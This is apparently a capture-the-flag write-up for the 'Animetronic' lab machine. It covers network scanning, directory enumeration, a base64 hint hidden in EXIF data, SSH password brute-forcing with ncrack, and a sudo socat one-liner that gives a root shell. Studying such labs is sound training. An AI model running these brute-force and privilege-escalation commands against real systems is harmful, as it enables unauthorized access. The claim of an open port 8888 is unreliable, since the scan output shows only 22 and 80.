---
title: Animetronic-Writeup
date: 2024-03-23
categories:
  - Writeups
tags:
  - Linux
  - Enumeration
  - PrivEsc
---
# Arp-scan 

 Detecting the ip of the machine

```bash
192.168.1.76 08:00:27:06:e0:17 PCS Systemtechnik GmbH
```


# Ports

Starting with port scanning by using nmap

```bash
Host is up (0.018s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 

|   256 59:eb:51:67:e5:6a:9e:c1:4c:4e:c5:da:cd:ab:4c:eb (ECDSA)

|_  256 96:da:61:17:e2:23:ca:70:19:b5:3f:53:b5:5a:02:59 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Animetronic

|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 08:00:27:06:E0:17 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  
TRACEROUTE

HOP RTT      ADDRESS

1   17.72 ms animetronic (192.168.1.76)
```

We can see that 80, 22 and 8888 ports are opened

# Url Enumeration

Use Dirsearch for directory discovery

```shell
dirsearch -u http://192.168.1.76 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
# result -> /staffpages/new_employees
```

(note that the default dictionary might not work)

## Exif 

As we access the directory, we can see nothing but a picture.

Download it and check the exif data of it:
```shell
root@kali ~/Downloads [1]# exiftool new_employees.jpeg
ExifTool Version Number         : 12.67
File Name                       : new_employees.jpeg
Directory                       : .
File Size                       : 160 kB
File Modification Date/Time     : 2024:03:22 12:54:39-04:00
File Access Date/Time           : 2024:03:22 12:55:22-04:00
File Inode Change Date/Time     : 2024:03:22 12:54:39-04:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Comment                         : page for you michael : ya/HnXNzyZDGg8ed4oC+yZ9vybnigL7Jr8SxyZTJpcmQx53Xnwo=
Image Width                     : 703
Image Height                    : 1136
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 703x1136
Megapixels                      : 0.799
```

 Decoding:

```bash
echo "ya/HnXNzyZDGg8ed4oC+yZ9vybnigL7Jr8SxyZTJpcmQx53Xnwo=" | base64 -d
```

Result :

```shell
ɯǝssɐƃǝ‾ɟoɹ‾ɯıɔɥɐǝן # message_for_michael
```

Then we can do a smart assumption that this might be a directory.

By accessing it:

![](/assets/img/animetronic/Note_img.png)

Then:

![](/assets/img/animetronic/personal_info.png)


We can make another guess that this might be for ssh. Hence what we need to do now is to use cupp to create a dictionary, then we can consider using ncrack to get the ssh user and password.

ssh user & password:

```
ncrack -v -u michael -P michael.txt -T5 ssh://192.168.1.76 -f
```

Result:

```shell
192.168.1.76 22/tcp ssh: 'michael' 'leahcim1996'
```

## SSH

As we login into via ssh, we are able to see a file "Note.txt"

```shell
michael@animetronic:/home/henry$ cat Note.txt 
if you need my account to do anything on the server,
you will find my password in file named

aGVucnlwYXNzd29yZC50eHQK
```

By decoding it, it is "henrypassword.txt".

```shell
find / -name henrypassword.txt
```

Result:

```shell
/home/henry/.new_folder/dir289/dir26/dir10/henrypassword.txt
```

Then we are able to get the password of user henry:

```shell
michael@animetronic:/home/henry$ cat /home/henry/.new_folder/dir289/dir26/dir10/henrypassword.txt
IHateWilliam
```

Login into user henry:

```shell
henry@animetronic:~$ sudo -l
Matching Defaults entries for henry on animetronic:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User henry may run the following commands on animetronic:
    (root) NOPASSWD: /usr/bin/socat
```

## Privilege Escalation

```shell
sudo socat stdin exec:/bin/bash
```

